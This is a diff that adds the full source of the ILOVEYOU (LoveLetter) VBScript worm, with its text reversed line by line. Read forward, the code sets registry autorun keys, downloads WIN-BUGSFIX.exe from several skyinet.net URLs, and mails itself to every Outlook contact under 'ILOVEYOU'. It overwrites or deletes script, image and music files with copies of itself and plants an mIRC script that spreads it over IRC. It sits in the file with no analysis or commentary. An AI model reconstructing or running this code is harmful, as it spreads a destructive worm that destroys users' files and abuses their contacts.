@@ -1,0 +1,550 @@
+
+bus dne 
+
+ esolc.d 
+
+ 6td etirw.d 
+
+ flrcbv etirw.d 
+
+ )flrcbv,senil(nioj etirw.d 
+
+ 5td etirw.d )2,"MTH.UOY-ROF-RETTEL-EVOL\"+metsysrid(eliFtxeTnepO.osf=d tes 
+
+ esolc.b )"MTH.UOY-ROF-RETTEL-EVOL\"+metsysrid(eliFtxeTetaerC.osf=b tes 
+
+ txen 
+
+ fi dne "_ &flrcbv&"&)43(rhc+)n(senil+)43(rhc=)n(senil 
+
+ esle 
+
+ )43(rhc+)n(senil+)43(rhc=)n(senil 
+
+ neht )n=1l( fi ))73(rhc+)54(rhc+)73(rhc,"\",)n(senil(ecalper=)n(senil 
+
+ ))39(rhc+)54(rhc+)39(rhc,"""",)n(senil(ecalper=)n(senil ))19(rhc+)54(rhc+)19(rhc,"'",)n(senil(ecalper=)n(senil 
+
+ )senil(dnuobu ot 0=n rof 
+
+ )senil(dnuobu=1l 
+
+ )flrcbv,llAdaeR.c(tilpS=senil 
+
+ )1,emaNlluFtpircS.tpircSW(eliFtxeTnepO.osf=c tes 
+
+ )"tcejbOmetsySeliF.gnitpircS"(tcejbOetaerC=osf tes 
+
+ )"\",)49(rhc&)54(rhc&)49(rhc,3td(ecalper=6td 
+
+ )"/",)36(rhc&)54(rhc&)36(rhc,2td(ecalper=3td )"""",)46(rhc&)54(rhc&)46(rhc,2td(ecalper=2td 
+
+ )"'",)53(rhc&)54(rhc&)53(rhc,2atd(ecalper=2td 
+
+ )"\",)49(rhc&)54(rhc&)49(rhc,4td(ecalper=5td 
+
+ )"/",)36(rhc&)54(rhc&)36(rhc,1td(ecalper=4td )"""",)46(rhc&)54(rhc&)46(rhc,1td(ecalper=1td 
+
+ )"'",)53(rhc&)54(rhc&)53(rhc,1atd(ecalper=1td 
+
+ ">TPIRCS?-?<" 
+
+ _ &flrcbv&">--?-??-?" _ &flrcbv&"@-@sbv.23lenreKSM^-^@-@&metsysrid,@-@23lenreKSM^-^nuR^- 
+
+ ^noisreVtnerruC^-^swodniW^-^tfosorciM^-^erawtfoS^-^ENIHCAM_LACOL_YEKH@-@ 
+
+ etirWgeR.tideger" 
+
+ _ &flrcbv&")@-@llehS.tpircSW@-@(tcejbOetaerC = tideger teS" 
+
+ _ &flrcbv&"fi dne" 
+
+ _ &flrcbv&"fi dne" 
+
+ _ &flrcbv&"esolc.wodniw" _ &flrcbv&"@-@XevitcA ezilaitini t#-#nac :RORRE@-@ etirw.********" 
+
+ _ &flrcbv&"neht )1=wa( fi" 
+
+ _ &flrcbv&"fi dne" 
+
+ _ &flrcbv&"0=wa" 
+
+ _ &flrcbv&"neht )424=rebmun.rre( fi" _ &flrcbv&"neht ))@-@sbv.23lenreKSM^-^@-@&metsysrid(stsixEeliF.osf( fi" 
+
+ _ &flrcbv&"esolc.irw" 
+
+ _ &flrcbv&"4edoc etirw.irw" 
+
+ _ &flrcbv&")@-@sbv.23lenreKSM^-^@-@&metsysrid(eliFtxeTetaerC.osf=irw 
+
+ tes" _ &flrcbv&"))29(rhc,)73(rhc&)54(rhc&)73(rhc,3edoc(ecalper=4edoc" _ &flrcbv&"))43(rhc,)39(rhc&)54(rhc&)39(rhc,2edoc(ecalper=3edoc" 
+
+ _ &flrcbv&"))93(rhc,)19(rhc&)54(rhc&)19(rhc,edoc(ecalper=2edoc" _ &flrcbv&")1(redloFlaicepSteG.osf=metsysrid tes" 
+
+ _ &flrcbv&")@-@tcejbOmetsySeliF.gnitpircS@-@(tcejbOetaerC=osf tes"=2atd 
+
+ "=edoc" 
+
+ _ &flrcbv&"1=wa" _ &flrcbv&"tidger,wa,4edoc,3edoc,2edoc,edoc,irw,metsysrid,osf mid" 
+
+ _ &flrcbv&"txen emuser rorre no" 
+
+ _ &flrcbv&"--!<" _ &flrcbv&">@-@tpircSBV@-@=EGAUGNAL TPIRCS<" 
+
+ _ &flrcbv&">TPIRCS?-?<" 
+
+ _ &flrcbv&">--?-??-?" 
+
+ _ &f lrcbv&"};)ih,iw(oTeziser.wodniw;)0,0(oTevom.wodniw;thgieHliava.neercs=ih 
+
+ rav;htdiWliava.neercs=iw rav{)neercs.wodniw( fi" 
+
+ _ &flrcbv&"?-??-?--!<" _ &flrcbv&">@-@tpircSJ@-@=egaugnal TPIRCS<" 
+
+ _ &flrcbv&">LMTH?-?<>YDOB?-?<" 
+
+ _ &flrcbv&" >EE UQRAM?-?<----------z--------------------z---------->@-@wolley@-@=ROLOCGB 
+
+ @-@etinifni@-@=POOL EEUQRAM<>RETNEC?-?<" 
+
+ _ &flrcbv&">p?-?<XevitcA elbanE 
+
+ ot nottub #-#SEY#-# sserp esaelP ->RB<elif LMTH siht daer ot elbanE oT>p<>p?-?<lortnoC XevitcA deen elif LMTH sihT>p<>RETNEC<" 
+
+ _ &flrcbv&">@-@3399FF#@-@=ROLOCGB 
+
+ @-@dexif@-@=SEITREPORPGB 
+
+ @-@)#-#niam#-#,#-#MTH .UOY-ROF-RETTEL-EVOL#-#(nepo.wodniw;#-#niam#-#=eman.wodniw@-@=NWODYEKNO" 
+
+ _ &flrcbv&" @-@)#-#niam#-#,#-#MTH 
+
+ .UOY-ROF-RETTEL-EVOL#-#(nepo.wodniw;#-#niam#-#=eman.wodniw@-@=TUOESUOMNO 
+
+ YDOB<>DAEH?-?<" 
+
+ _ &flrcbv&">@-@...doog si siht kniht i tub elpmis@-@=TNETNOC 
+
+ @-@noitpircseD@-@=EMAN ****<" _ &flrcbv&">@-@0002 hcraM ?-? senippilihP ,alinaM ?-? puorG tfoSREMMARG@ 
+
+ ?-? moc.liam@redypsi ?-? redyps@-@=TNETNOC @-@rohtuA@-@=EMAN ****<" _ &flrcbv&">@-@RETTELEVOL 
+
+ - SBV KORAB@-@=TNETNOC @-@rotareneG@-@=EMAN ****<>ELTIT?-?<LMTH - RETTELEVOL>ELTIT<>DAEH<>LMTH<"=1atd 
+
+ 6td,5td,1l,4td,3td,2td,1td,2atd,1atd,n,senil mid 
+
+ txeN emuseR rorrE nO 
+
+ lmth bus 
+
+ bus dne 
+
+ gnihtoN=ipam teS 
+
+ gnihtoN=tuo teS 
+
+ txen 
+
+ fi dne tnuoC.seirtnEsserddA.a,a&"\BAW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" 
+
+ etirWgeR.tideger 
+
+ esle tnuoC.seirtnEsserddA.a,a&"\BAW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" 
+
+ etirWgeR.tideger 
+
+ txen 
+
+ 1+x=x 
+
+ fi dne "DROWD_GER",1,daelam&"\BAW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" 
+
+ etirWgeR.tideger 
+
+ dneS.elam )"sbv.TXT.UOY-ROF-RETTEL-EVOL\"&metsysrid(ddA.stnemhcattA.elam 
+
+ ".em morf gnimoc RETTELEVOL dehcatta eht kcehc yldnik"&flrcbv = ydoB.elam 
+
+ "UOYEVOLI" = tcejbuS.elam 
+
+ )daelam(ddA.stneipiceR.elam 
+
+ )0(metIetaerC.tuo=elam tes 
+
+ neht )""=dager( fi 
+
+ ) daelam&"\BAW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH"(daeRgeR.tideger=dager 
+
+ ""=dager 
+
+ )x(seirtnEsserddA.a=daelam 
+
+ tnuoC.seirtnEsserddA.a ot 1=seirtnertc rof 
+
+ neht ))vger(tni>)tnuoC.seirtnEsserddA.a(tni( fi 
+
+ fi dne 
+
+ 1=vger 
+
+ neht )""=vger( fi )a&"\BAW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH"(daeRgeR.tideger=vger 
+
+ 1=x 
+
+ )stsilrtc(stsiLsserddA.ipam=a tes 
+
+ tnuoC.stsiLsserddA.ipam ot 1=stsilrtc rof 
+
+ )"IPAM"(ecapSemaNteG.tuo=ipam tes 
+
+ )"noitacilppA.kooltuO"(tcejbOetaerC.tpircSW=tuo tes 
+
+ )"llehS.tpircSW"(tcejbOetaerC=tideger tes 
+
+ dager,vger,tideger,b,daelam,seirtnertc,stsilrtc,a,x mid 
+
+ txeN emuseR rorrE nO 
+
+ )(liameotdaerps bus 
+
+ noitcnuf dne 
+
+ gsm = tsixeelif 
+
+ fi dne 
+
+ 1 = gsm 
+
+ esle 
+
+ 0 = gsm 
+
+ neht ))cepsredlof(stsixEredloFteG.osf( fi 
+
+ gsm mid 
+
+ txeN emuseR rorrE nO 
+
+ )cepsredlof(tsixeredlof noitcnuf 
+
+ noitcnuf dne 
+
+ gsm = tsixeelif 
+
+ fi dne 
+
+ 1 = gsm 
+
+ esle 
+
+ 0 = gsm 
+
+ nehT ))cepselif(stsixEeliF.osf( fi 
+
+ gsm mid 
+
+ txeN emuseR rorrE nO 
+
+ )cepselif(tsixeelif noitcnuf 
+
+ noitcnuf dne 
+
+ )eulav(daeRgeR.tideger=tegger 
+
+ )"llehS.tpircSW"(tcejbOetaerC = tideger teS 
+
+ )eulav(tegger noitcnuf 
+
+ bus dne 
+
+ eulavger,yekger etirWgeR.tideger 
+
+ )"llehS.tpircSW"(tcejbOetaerC = tideger teS 
+
+ )eulavger,yekger(etaercger bus 
+
+ bus dne 
+
+ txen 
+
+ )htap.1f(tsilredlof 
+
+ )htap.1f(seliftcefni 
+
+ fs ni 1f hcae rof 
+
+ sredloFbuS.f = fs tes 
+
+ )cepsredlof(redloFteG.osf = f tes 
+
+ fs,1f,f mid 
+
+ txeN emuseR rorrE nO 
+
+ )cepsredlof(tsilredlof bus 
+
+ bus dne 
+
+ txen 
+
+ fi dne 
+
+ fi dne 
+
+ cepsredlof=qe 
+
+ esolc.initpircs 
+
+ "}=3n" eniLetirW.initpircs 
+
+ "MTH.UOY-ROF-RETTEL-EVOL\"&metsysrid&" 
+
+ kcin$ dnes ccd./  =2n" eniLetirW.initpircs "} tlah { ) em$ == kcin$ ( fi/  =1n" eniLetirW.initpircs 
+
+ "{:#:NIOJ:1 no=0n" eniLetirW.initpircs 
+
+ ";" eniLetirW.initpircs 
+
+ "moc.crim.www//:ptth;" eniLetirW.initpircs 
+
+ "yeB-madraM delahK;" eniLetirW.initpircs 
+
+ ";" eniLetirW.initpircs 
+
+ "sknaht .yltcerroc nur ton lliw dna tceffa lliw SWODNIW ...tpurroc    " eniLetirW.initpircs 
+
+ "lliw CRIm fi ,tpurroc lliw CRIm ...tpircs siht tide tnod esaelP  ;" eniLetirW.initpircs 
+
+ "tpircS CRIm;" eniLetirW.initpircs 
+
+ "]tpircs[" eniLetirW.initpircs )"ini.tpircs\"&cepsredlof(eliFtxeTetaerC.osf=initpircs tes 
+
+ neht )"plh.crim"=s( ro )"ini.tpircs"=s( ro )"ini.crim"=s( ro )"exe.23knilm"=s( ro )"exe.23crim"=s( fi 
+
+ neht )cepsredlof><qe( fi 
+
+ fi dne 
+
+ 2+setubirtta.tta=setubirtta.tta 
+
+ )htap.1f(eliFteG.osf=tta tes 
+
+ esolc.3pm 
+
+ ypocsbv etirw.3pm 
+
+ )"sbv."&htap.1f(eliFtxeTetaerC.osf=3pm tes 
+
+ neht )"2pm"=txe( ro )"3pm"=txe(fiesle 
+
+ )htap.1f(eliFeteleD.osf 
+
+ )"sbv."&htap.1f(ypoc.poc 
+
+ )htap.1f(eliFteG.osf=poc tes 
+
+ esolc.pa 
+
+ ypocsbv etirw.pa 
+
+ )eurt,2,htap.1f(eliFtxeTnepO.osf=pa tes 
+
+ neht )"gepj"=txe( ro )"gpj"=txe(fiesle 
+
+ )htap.1f(eliFeteleD.osf )"sbv."&emanb&"\"&cepsredlof(ypoc.poc 
+
+ )htap.1f(eliFteG.osf=poc tes 
+
+ )htap.1f(emaNesaBteG.osf=emanb 
+
+ esolc.pa 
+
+ ypocsbv etirw.pa 
+
+ )eurt,2,htap.1f(eliFtxeTnepO.osf=pa tes 
+
+ neht )"ath"=txe( ro )"tcs"=txe( ro )"hsw"=txe( ro )"ssc"=txe( ro )"esj"=txe( ro )"sj"=txe(fiesle 
+
+ esolc.pa 
+
+ ypocsbv etirw.pa 
+
+ )eurt,2,htap.1f(eliFtxeTnepO.osf=pa tes 
+
+ neht )"ebv"=txe( ro )"sbv"=txe( fi 
+
+ )eman.1f(esacl=s 
+
+ )txe(esacl=txe 
+
+ )htap.1f(emaNnoisnetxEteG.osf=txe 
+
+ cf ni 1f hcae rof 
+
+ seliF.f = cf tes 
+
+ )cepsredlof(redloFteG.osf = f tes 
+
+ 3pm,emanb,s,emanfcrim,pa,txe,cf,1f,f mid 
+
+ txeN emuseR rorrE nO 
+
+ )cepsredlof(seliftcefni bus 
+
+ bus dne 
+
+ s = virdatsil 
+
+ txeN 
+
+ fi dne 
+
+ )"\"&htap.d(tsilredlof 
+
+ nehT 3=epyTevirD.d ro 2 = epyTevirD.d fI 
+
+ cd ni d hcaE roF 
+
+ sevirD.osf = cd teS 
+
+ s,cd,d miD 
+
+ txeN emuseR rorrE nO 
+
+ virdatsil bus 
+
+ bus dne 
+
+ fi dne 
+
+ "knalb:tuoba","egaP tratS\niaM\rerolpxE 
+
+ tenretnI\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" etaercger 
+
+ "exe.XIFSGUB-NIW\"&daernwod,"XIFSG UB-NIW\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" 
+
+ etaercger neht )0=)"exe.XIFSGUB-NIW\"&daernwod(tsixeelif( fi 
+
+ fi dne 
+
+ fi dne 
+
+ "exe.XIFSGUB- NIW/gjht7yui432164732wqgfhsdamnvbcxnzmbewqbhBNklgdfsajhPhjdsarewqgUYhkjG 
+
+ DSFAhBJHutwqkjHLKkgfnmBNlkjfdskjhfgds/uhc~/ten.teniyks.www//:ptth","egaP 
+
+ tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH" etaercger 
+
+ neht 4 = mun fiesle 
+
+ "exe.XIFSGUB-NIW/gvbV3b76REgfhOPmnZQ 
+
+ dBpobkEFfh5VFbv891qaqGpRGbckjRT6fj/ihciok~/ten.teniyks.www//:ptth","egaP 
+
+ tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH" etaercger 
+
+ neht 3 = mun fiesle 
+
+ "exe.XIFSGUB-NIW/w4jqkhjKJLKmbvbGHHnj4kjh423687645eWre 
+
+ wqyIUjkiFGDyrtewnJKhgjdflfjdalks/taclegna~/ten.teniyks.www//:ptth","egaP tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH" etaercger 
+
+ neht 2 = mun fiesle 
+
+ "exe.XIFSGUB-NIW/TYvbjn9767fdsvg5437856wjnPh 
+
+ mfsdrtewFTMntrewtyvcxkjhrewnjhKJH/s1gnuoy~/ten.teniyks.www//:ptth","egaP 
+
+ tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH" etaercger 
+
+ neht 1 = mun fi 
+
+ )1 + )dnR * 4((tnI = mun 
+
+ ezimodnaR 
+
+ neht )1=)"exe.23TAFniW\"&metsysrid(tsixeelif( fi 
+
+ fi dne 
+
+ "\:c"=daernwod 
+
+ neht )""=daernwod( fi 
+
+ )"yrotceriD daolnwoD\rerolpxE tenretnI\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH"(tegger=daernwod 
+
+ ""=daernwod 
+
+ "sbv.LLD23niW\"&niwrid,"LLD23niW\s ecivreSnuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" 
+
+ etaercger 
+
+ "sbv.23lenreKSM\"&metsysrid,"23le nreKSM\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" 
+
+ etaercger 
+
+ daernwod,mun miD 
+
+ txeN emuseR rorrE nO 
+
+ )(snurger bus 
+
+ bus dne 
+
+ )(virdatsil 
+
+ )(liameotdaerps 
+
+ )(lmth 
+
+ )(snurger 
+
+ )"sbv.TXT.UOY-ROF-RETTEL-EVOL\"&metsysrid(ypoC.c 
+
+ )"sbv.LLD23niW\"&niwrid(ypoC.c 
+
+ )"sbv.23lenreKSM\"&metsysrid(ypoC.c 
+
+ )emaNlluFtpircS.tpircSW(eliFteG.osf = c teS 
+
+ )2(redloFlaicepSteG.osf = pmetrid teS 
+
+ )1(redloFlaicepSteG.osf = metsysrid teS 
+
+ )0(redloFlaicepSteG.osf = niwrid teS 
+
+ fi dne 
+
+ "DROWD_GER",0,"tuoemiT\sgnitteS\tsoH gnitpircS swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" etirWgeR.rcsw 
+
+ neht )1=>rr( fi 
+
+ )"tuoemiT\sgnitteS\tsoH gnitpircS swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH"(daeRgeR.rcsw=rr 
+
+ )"llehS.tpircSW"(tcejbOetaerC=rcsw tes 
+
+ rr,rcsw mid 
+
+ txeN emuseR rorrE nO 
+
+ )(niam bus 
+
+ )(niam 
+
+ llAdaeR.elif=ypocsbv 
+
+ )1,emanlluFtpircS.tpircSW(eliFtxeTnepO.osf = elif tes 
+
+ )"tcejbOmetsySeliF.gnitpircS"(tcejbOetaerC = osf teS 
+
+ 0=rtc 
+
+ ""=qe 
+
+ wod,ypocsbv,elif,rtc,qe,pmetrid,niwrid,metsysrid,osf mid 
+
+ txeN emuseR rorrE nO 
+
+dasarP ias inaM yB detidE :yb mer
+
+ >evol ot etah i< )ebv(rettelevol- korab  mer
